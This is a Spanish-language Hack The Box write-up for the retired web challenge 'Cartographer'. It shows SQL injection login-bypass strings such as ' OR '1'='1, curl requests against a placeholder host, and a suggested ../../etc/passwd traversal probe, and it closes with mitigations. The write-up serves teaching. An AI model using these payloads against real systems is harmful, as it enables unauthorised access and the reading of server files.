---
challenge: Cartographer
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, login-bypass, enumeration, php]
---

# Cartographer — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Login PHP con **SQL injection** clásica: `' OR '1'='1` entra sin credenciales. Dentro, el panel carga la sección con `panel.php?info=<valor>`, y basta pedir `info=flag` para que devuelva la flag. La fuerza bruta no lleva a ningún sitio; el reto es de inyección, no de diccionario.

## Enunciado

«Unos hackers están montando un servidor de mando y control. ¿Puedes entrar y ver qué traman?»

## Análisis

```bash
curl -s http://<IP>:<puerto>/ | head -40
```

Formulario `POST` con `username` y `password`. Antes de atacar, se comprueba si hay inyección:

```bash
curl -s -X POST http://<IP>:<puerto>/index.php \
  -d "username=admin'-- -&password=x" -i | head
```

Alternativas habituales:

```text
' OR '1'='1
'||' 1 '=' 1
admin' #
```

Si el servidor responde con redirección al panel, la consulta se está concatenando.

## Explotación

Con sesión iniciada, la navegación usa un parámetro:

```text
http://<IP>:<puerto>/panel.php?info=home
```

El valor se usa para incluir la sección. Se prueba con `info=flag`:

```bash
curl -s -b 'PHPSESSID=<id>' "http://<IP>:<puerto>/panel.php?info=flag"
```

```text
HTB{<flag>}
```

Si `info` estuviera filtrando rutas, el mismo parámetro sirve para enumerar: `home`, `about`, `contact`, `flag`, `admin`… y para probar traversal (`../../etc/passwd`) cuando no hay allowlist.

## Tropiezos

- **Sesión**: el panel exige la cookie `PHPSESSID` del login; guardarla con `-c/-b`.
- **Fuerza bruta inútil**: `admin:admin`, `admin:password` no funcionan y los diccionarios tampoco.
- **Parámetro**: si `info` no responde, probar `page`, `view`, `file`; el nombre exacto se ve en los enlaces del panel.
- **Comillas**: `admin'-- -` necesita el espacio antes del guion en MySQL.

## Lecciones

- Un `SELECT` concatenado en un login es bypass inmediato: no hace falta contraseña.
- El parámetro que elige «sección» suele ser también el que sirve la flag.
- Mitigación: consultas preparadas, comparación de hash en servidor y allowlist de secciones en lugar de include dinámico.
